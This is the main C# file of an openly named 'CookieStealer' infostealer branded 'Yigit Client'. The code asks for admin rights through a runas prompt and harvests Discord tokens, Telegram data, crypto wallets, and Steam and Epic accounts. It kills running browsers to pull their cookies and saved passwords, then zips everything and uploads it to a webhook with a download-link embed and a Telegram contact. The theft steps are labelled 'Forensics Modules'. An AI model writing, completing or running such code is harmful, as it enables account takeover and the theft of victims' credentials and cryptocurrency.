using System.Diagnostics;
using System.Runtime.InteropServices;

namespace CookieStealer;

class Program
{
    static void Main(string[] args)
    {
        if (!NativeMethods.IsUserAnAdmin())
        {
            try
            {
                string exePath = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule!.FileName!;
                NativeMethods.ShellExecuteW(IntPtr.Zero, "runas", exePath,
                    string.Join(" ", args), null, 0);
            }
            catch (Exception e) { Console.WriteLine($"[-] Failed to elevate privileges: {e.Message}"); }
            return;
        }

        try { Run(); }
        catch (Exception e) { Console.WriteLine($"[!] Unhandled exception: {e.Message}"); }
        finally { Console.WriteLine("EXECUTION COMPLETE"); }
    }

    static void Run()
    {
        Console.WriteLine("\n" + new string('=', 50));
        Console.WriteLine("      Yigit Client - STARTING      ");
        Console.WriteLine(new string('=', 50) + "\n");

        Directory.CreateDirectory(Config.OUTPUT_BASE_DIR);

        // Forensics Modules
        AppStealers.CollectSystemInfo();
        DiscordStealer.ExtractDiscordTokens();
        AppStealers.StealTelegram();
        AppStealers.StealWallets();
        AppStealers.StealSteam();
        AppStealers.StealEpic();

        // Kill browser processes
        Console.WriteLine("[*] Killing browser processes...");
        foreach (var (_, config) in Config.BROWSERS)
        {
            try
            {
                Process.Start(new ProcessStartInfo("taskkill", $"/F /IM {config.ProcessName}")
                { CreateNoWindow = true, UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true })?.WaitForExit();
            }
            catch { }
        }

        // Process Data
        Console.WriteLine("[*] Processing browser data (Cookies, Passwords, etc.)...");
        var processedPaths = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

        foreach (var (browserName, config) in Config.BROWSERS)
        {
            try
            {
                string dataPath = Path.Combine(userProfile, config.DataPath);
                if (Directory.Exists(dataPath))
                {
                    string norm = dataPath.ToLower();
                    if (processedPaths.Contains(norm)) continue;
                    processedPaths.Add(norm);
                    Console.WriteLine($"    -> Processing {config.Name}...");
                }

                if (config.Type == "chromium")
                    BrowserExtractor.ProcessChromiumBrowser(browserName, config);
                else if (config.Type == "gecko")
                    BrowserExtractor.ProcessGeckoBrowser(browserName, config);
            }
            catch (Exception e) { Console.WriteLine($"    [!] Error processing {browserName}: {e.Message}"); }
        }

        // Final Zipping and Reporting
        Console.WriteLine("\n[*] Creating final browser data archive...");
        string zipPath = Config.OUTPUT_BASE_DIR + ".zip";
        try
        {
            AppStealers.ZipDirectory(Config.OUTPUT_BASE_DIR, zipPath);
            if (File.Exists(zipPath))
            {
                Console.WriteLine("[+] Archive created. Uploading to Webhook...");
                string? link = WebhookHelper.UploadFile(zipPath);
                if (link != null)
                {
                    WebhookHelper.SendWebhook(new
                    {
                        embeds = new[] { new {
                            title = $"⚓ Light Browser Data - {Environment.MachineName}",
                            description = $"🔍 Download All Data: [CLICK HERE!]({link})",
                            color = 0x808080,
                            footer = new {
                                text = "Yigit | t.me/layer7730",
                                icon_url = "https://i.imgur.com/pBQ2Npk.jpeg"
                            }
                        }}
                    });
                    Console.WriteLine($"[+] Final report sent. Link: {link}");
                }
                else Console.WriteLine("[-] Upload failed.");
                try { File.Delete(zipPath); } catch { }
            }
        }
        catch (Exception e) { Console.WriteLine($"[-] Final zipping/reporting failed: {e.Message}"); }

        Console.WriteLine("\n" + new string('=', 50));
        Console.WriteLine("      Yigit Client - COMPLETED      ");
        Console.WriteLine(new string('=', 50) + "\n");
    }
}
